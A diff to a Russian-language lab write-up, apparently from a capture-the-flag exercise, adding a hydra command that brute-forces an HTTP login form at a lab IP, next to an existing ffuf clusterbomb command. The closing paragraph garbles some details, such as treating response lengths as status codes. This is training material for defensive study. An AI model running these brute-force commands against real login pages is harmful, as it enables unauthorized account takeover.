@@ -3562,11 +3562,21 @@ _Сможете ли вы помочь Макскиди и его команде
 
 ![[Pasted image 20240726151409.png]]
 
+Обычно правильной комбинацией является комбинация разной длины. 
+
 С п.м. ffuf:
 
 ```bash
 ffuf -request request.txt -request-proto http -mode clusterbomb -w /path/to/users/file.txt:USERFUZZ -w /path/to/password/file.txt:PASSFUZZ -mc 200
 ```
+
+С п.м. hydra:
+
+```bash
+hydra -L usernames.txt -P passwords.txt 10.10.226.104 http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:username_incorrect"
+```
+
+![[Pasted image 20240826205714.png]]
 
 Теперь вы можете видеть, что была проведена атака методом перебора, и все запросы были перенаправлены куда-то, но если вы посмотрите на длину запроса полезной нагрузки, все остальные запросы имеют код 309, но 8-й запрос получил код 255, что означает, что это может сработать, так что теперь не нужно идти и размещать эти учетные данные на веб-сайте.
 
